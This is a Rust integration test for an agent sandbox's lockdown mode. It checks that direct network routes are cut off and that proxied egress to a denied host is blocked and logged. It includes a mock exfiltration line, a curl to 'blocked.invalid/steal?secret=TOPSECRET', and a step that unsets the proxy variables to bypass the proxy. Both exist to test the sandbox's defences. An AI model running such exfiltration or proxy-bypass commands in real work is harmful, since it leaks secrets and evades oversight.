//! The no-direct-route LOCKDOWN mode through the real `agentstack run
//! --sandbox --lockdown` binary — Docker-gated.
//!
//! Proves the topological confinement end to end: the sandbox container sits
//! on an internal Docker network with the egress-proxy sidecar as its only
//! peer, so
//! - a direct connection that BYPASSES the proxy env reaches NOTHING (no host
//!   route, no internet) — this is the property `--sandbox` alone can't give;
//! - a request THROUGH the injected proxy to a denied host is blocked and
//!   recorded; and every decision lands in the run's flight recorder.
//!
//! Hermetic: the denied target is `blocked.invalid` (RFC-2606, never
//! resolves). Needs the egress-proxy sidecar image; the test builds it and
//! passes its tag via `AGENTSTACK_EGRESS_IMAGE`. Compiles only with
//! `--features sandbox`; SKIPS without a Docker daemon. Run:
//!   cargo test -p agentstack --features sandbox --test sandbox_lockdown -- --nocapture
#![cfg(feature = "sandbox")]

use std::fs;
use std::process::Command;

use agentstack::calllog::{RunEvent, RunLog};

// curl (not busybox wget) as the harness: curl does proper CONNECT tunneling
// through an HTTPS proxy, which is what the sidecar filters. The image is
// alpine-based, so `sh -c …` still works.
const HARNESS_IMAGE: &str = "curlimages/curl:latest";
const EGRESS_IMAGE: &str = "agentstack/egress-proxy:lockdown-test";
const DENIED: &str = "blocked.invalid";

fn docker_up() -> bool {
    Command::new("docker")
        .arg("info")
        .output()
        .map(|o| o.status.success())
        .unwrap_or(false)
}

fn pull(image: &str) -> bool {
    Command::new("docker")
        .args(["pull", image])
        .status()
        .map(|s| s.success())
        .unwrap_or(false)
}

fn repo_root() -> std::path::PathBuf {
    std::path::PathBuf::from(env!("CARGO_MANIFEST_DIR"))
        .join("../..")
        .canonicalize()
        .unwrap()
}

/// Build the sidecar image once (the cli's lockdown path needs it present).
fn build_egress_image() -> bool {
    Command::new("docker")
        .args([
            "build",
            "-f",
            "docker/egress-proxy.Dockerfile",
            "-t",
            EGRESS_IMAGE,
            ".",
        ])
        .current_dir(repo_root())
        .status()
        .map(|s| s.success())
        .unwrap_or(false)
}

fn ready() -> bool {
    if !docker_up() {
        eprintln!("SKIP: no Docker daemon");
        return false;
    }
    if !pull(HARNESS_IMAGE) {
        eprintln!("SKIP: cannot pull {HARNESS_IMAGE}");
        return false;
    }
    eprintln!("building {EGRESS_IMAGE} (first run compiles the workspace — cached after)…");
    if !build_egress_image() {
        eprintln!("SKIP: cannot build the egress sidecar image");
        return false;
    }
    true
}

fn strip_ansi(s: &str) -> String {
    let mut out = String::with_capacity(s.len());
    let mut chars = s.chars().peekable();
    while let Some(c) = chars.next() {
        if c == '\u{1b}' {
            for n in chars.by_ref() {
                if n == 'm' {
                    break;
                }
            }
        } else {
            out.push(c);
        }
    }
    out
}

/// Run the real binary in lockdown mode with `shell_cmd` as the container's
/// `sh -c` payload, in a throwaway HOME + project. Returns (success, stdout).
fn run_lockdown(shell_cmd: &str) -> (bool, String, std::path::PathBuf) {
    let tmp = assert_fs::TempDir::new().unwrap();
    let home = tmp.path().join("home");
    let as_home = home.join(".agentstack");
    fs::create_dir_all(as_home.join("adapters")).unwrap();
    // Machine policy DENIES the target host (rename-proof "*").
    fs::write(
        as_home.join("agentstack.toml"),
        format!("version = 1\n[policy.egress]\n\"*\" = [\"!{DENIED}\"]\n"),
    )
    .unwrap();
    // A harness whose launch binary is `sh`, so the command becomes `sh -c …`.
    fs::write(
        as_home.join("adapters/shtest.yaml"),
        "id: shtest\ndisplay: Sh Test\ndetect:\n  bin: sh\n",
    )
    .unwrap();

    let proj = tmp.path().join("proj");
    fs::create_dir_all(&proj).unwrap();
    fs::write(proj.join("agentstack.toml"), "version = 1\n").unwrap();

    let out = Command::new(env!("CARGO_BIN_EXE_agentstack"))
        .args(["run", "--lockdown", "shtest", "--", "-c", shell_cmd])
        .current_dir(&proj)
        .env("HOME", &home)
        .env("AGENTSTACK_HOME", &as_home)
        .env("AGENTSTACK_SANDBOX_IMAGE", HARNESS_IMAGE)
        .env("AGENTSTACK_EGRESS_IMAGE", EGRESS_IMAGE)
        .output()
        .unwrap();
    let stdout = strip_ansi(&String::from_utf8_lossy(&out.stdout));
    eprintln!("--- run --lockdown stdout ---\n{stdout}");
    eprintln!("--- stderr ---\n{}", String::from_utf8_lossy(&out.stderr));
    // Keep the temp dir alive by leaking its handle into the returned path's
    // parent — we read the run log via AGENTSTACK_HOME below.
    std::mem::forget(tmp);
    (out.status.success(), stdout, as_home)
}

fn run_id_from(stdout: &str) -> String {
    stdout
        .split_whitespace()
        .find(|w| w.starts_with("r-"))
        .map(|w| w.trim_end_matches([')', '.']).to_string())
        .expect("run --lockdown prints a run id")
}

#[test]
fn lockdown_blocks_direct_route_and_records_proxied_denial() {
    if !ready() {
        return;
    }

    // 1) NO-DIRECT-ROUTE: unset the proxy env inside the container and try to
    //    reach the open internet directly. On an internal Docker network there
    //    is no route (and no DNS to the outside), so wget must fail — the
    //    container prints BLOCKED, never REACHED. This is the property
    //    `--sandbox` alone cannot provide.
    eprintln!("\n[1] a direct route bypassing the proxy env must reach nothing");
    let (ok, stdout, _home) = run_lockdown(
        // -m 5: bail fast. example.com has no route from an internal net.
        "unset HTTPS_PROXY http_proxy https_proxy HTTP_PROXY; \
         curl -s -m 5 http://example.com/ >/dev/null 2>&1 && echo REACHED || echo BLOCKED",
    );
    assert!(ok, "the harness itself should run (sh exists in busybox)");
    assert!(
        stdout.contains("BLOCKED") && !stdout.contains("REACHED"),
        "a direct connection bypassing the proxy must reach nothing; got: {stdout}"
    );

    // 2) PROXIED DENY: with the proxy env in place (the CLI injects it), a
    //    request to the denied host is refused at the sidecar and recorded.
    eprintln!("\n[2] a proxied request to a denied host is blocked + recorded");
    let (_ok, stdout, as_home) = run_lockdown(&format!(
        "curl -s -m 6 https://{DENIED}/steal?secret=TOPSECRET; true"
    ));
    let run_id = run_id_from(&stdout);

    std::env::set_var("AGENTSTACK_HOME", &as_home);
    let events = RunLog::read(&run_id);
    eprintln!("--- run {run_id} events ---\n{events:#?}");

    assert!(
        events
            .iter()
            .any(|e| matches!(e, RunEvent::SandboxStarted { .. })),
        "the run should be recorded as started: {events:?}"
    );
    assert!(
        events.iter().any(|e| matches!(
            e,
            RunEvent::Egress { allowed: false, host, .. } if host == DENIED
        )),
        "the sidecar must record a BLOCK of egress to {DENIED}: {events:?}"
    );
}
